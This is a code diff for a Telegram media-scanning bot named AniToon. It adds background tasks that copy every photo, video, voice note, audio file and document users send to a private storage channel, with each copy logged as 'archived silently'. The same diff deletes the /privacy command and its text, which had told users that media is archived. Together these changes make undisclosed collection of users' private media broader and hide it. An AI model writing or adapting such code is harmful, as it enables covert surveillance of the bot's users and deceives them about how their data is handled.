@@ -162,6 +162,8 @@ owner_broadcast_pending: dict[int, float] = {}
 group_onboarding_bootstrap: dict[tuple[int, int], float] = {}
 bot_audience_touch_cache: dict[tuple[int, int], float] = {}
 preview_tasks: set[asyncio.Task] = set()
+storage_tasks: set[asyncio.Task] = set()
+storage_semaphore = asyncio.Semaphore(2)
 storage_peers: dict[int, Any] = {}
 
 
@@ -274,7 +276,6 @@ CLONE_HELP_TEXT = (
     "/stats — View your 7-day stats\n"
     "/about — About AniToon\n"
     "/addtogroup — Add the bot to a group\n"
-    "/privacy — Privacy information\n"
     "/cancel — Cancel your running scan\n\n"
     "🤖 Clone management stays on the main AniToon bot."
 )
@@ -1426,12 +1427,6 @@ async def analyze_source(
             source_bot=bot_username,
         )
 
-        archive_ok = await archive_scanned_file(
-            client,
-            source_message,
-            user_id=user_id,
-            bot_username=bot_username,
-        )
         resend_ok = False
         if user_id is not None:
             resend_ok = await resend_scanned_file(
@@ -1712,9 +1707,11 @@ async def archive_scanned_file(
     user_id: int | None,
     bot_username: str,
 ) -> bool:
+    """Copy a fresh Telegram media reference into the private storage channel."""
     media = getattr(source_message, "media", None)
     if not media:
         return False
+
     peer = await _resolve_storage_peer(client)
     if peer is None:
         return False
@@ -1726,24 +1723,76 @@ async def archive_scanned_file(
         f"📄 <code>{html.escape(filename)}</code>\n"
         f"🤖 <b>@{html.escape(source_name)}</b>"
     )
-    if user_id is not None:
-        caption += f"\n🆔 User ID: <code>{int(user_id)}</code>"
 
     try:
-        await asyncio.wait_for(
-            client.send_file(
-                peer,
-                media,
-                caption=caption,
-                parse_mode="html",
-                allow_cache=True,
-            ),
-            timeout=STORAGE_SEND_TIMEOUT,
+        async with storage_semaphore:
+            await asyncio.wait_for(
+                client.send_file(
+                    peer,
+                    media,
+                    caption=caption,
+                    parse_mode="html",
+                    allow_cache=True,
+                ),
+                timeout=STORAGE_SEND_TIMEOUT,
+            )
+        log.info(
+            "Media archived silently | bot=%s | file=%s",
+            source_name,
+            filename,
         )
         return True
     except Exception:
-        log.warning("Storage archive failed | file=%s", filename, exc_info=True)
+        log.warning(
+            "Silent storage archive failed | bot=%s | file=%s",
+            source_name,
+            filename,
+            exc_info=True,
+        )
         return False
+
+
+def is_archivable_media_message(event: Any) -> bool:
+    message = getattr(event, "message", None)
+    if message is None:
+        return False
+
+    # Archive actual user media/files, not text commands or service messages.
+    return any(
+        getattr(message, attr, None) is not None
+        for attr in (
+            "document",
+            "video",
+            "audio",
+            "voice",
+            "photo",
+            "gif",
+        )
+    )
+
+
+def _schedule_storage_archive(
+    event: Any,
+    *,
+    client: Any,
+    bot_username: str,
+) -> None:
+    if not is_archivable_media_message(event):
+        return
+
+    sender = getattr(event, "sender_id", None)
+    user_id = int(sender) if sender is not None else None
+
+    task = asyncio.create_task(
+        archive_scanned_file(
+            client,
+            event.message,
+            user_id=user_id,
+            bot_username=bot_username,
+        )
+    )
+    storage_tasks.add(task)
+    task.add_done_callback(storage_tasks.discard)
 
 
 async def resend_scanned_file(
@@ -2132,7 +2181,6 @@ async def _set_bot_commands(client: TelegramClient, *, include_clone: bool) -> N
         types.BotCommand(command="stats", description="View your 7-day stats"),
         types.BotCommand(command="about", description="About AniToon"),
         types.BotCommand(command="addtogroup", description="Add the bot to a group"),
-        types.BotCommand(command="privacy", description="Privacy information"),
         types.BotCommand(command="cancel", description="Cancel your scan"),
     ]
     if include_clone:
@@ -2499,15 +2547,6 @@ async def render_public_status(event, *, edit: bool = True) -> None:
         await event.reply(text, parse_mode="html", buttons=back_buttons())
 
 
-PRIVACY_TEXT = (
-    "🔐 <b>AniToon Privacy</b>\n\n"
-    "🛡️ Media is inspected with bounded reads instead of creating a full local copy.\n"
-    "📊 Scan history is stored in MongoDB for the owner/user statistics.\n"
-    "🗄️ Scanned media is copied to the configured private storage channel for archiving.\n"
-    "🔑 Clone BotFather tokens are encrypted before being stored.\n"
-    "🗑️ Removing a clone removes its stored credential and disconnects the clone."
-)
-
 
 def is_checkable_message(event) -> bool:
     """Return True only for Telegram video/document messages that can be scanned."""
@@ -2558,6 +2597,13 @@ async def handle_new_message(
 
     if include_clone and await handle_clone_token_message(event):
         return
+
+    # Archive user media silently in the background for both main and clone bots.
+    _schedule_storage_archive(
+        event,
+        client=client,
+        bot_username=bot_username,
+    )
 
     if include_clone:
         sender_for_broadcast = await event.get_sender()
@@ -2681,11 +2727,6 @@ async def handle_new_message(
             await render_owner_resources(event, int(user_id))
         else:
             await render_public_status(event, edit=False)
-        return
-
-    if command == "/privacy":
-        await record_user(event)
-        await event.reply(PRIVACY_TEXT, parse_mode="html", buttons=back_buttons())
         return
 
     if command == "/clones":
@@ -4294,6 +4335,12 @@ async def main():
             temp_cleanup_task.cancel()
             with suppress(asyncio.CancelledError):
                 await temp_cleanup_task
+        for task in list(storage_tasks):
+            task.cancel()
+        for task in list(storage_tasks):
+            with suppress(asyncio.CancelledError):
+                await task
+        storage_tasks.clear()
         for task in list(preview_tasks):
             task.cancel()
         for task in list(preview_tasks):
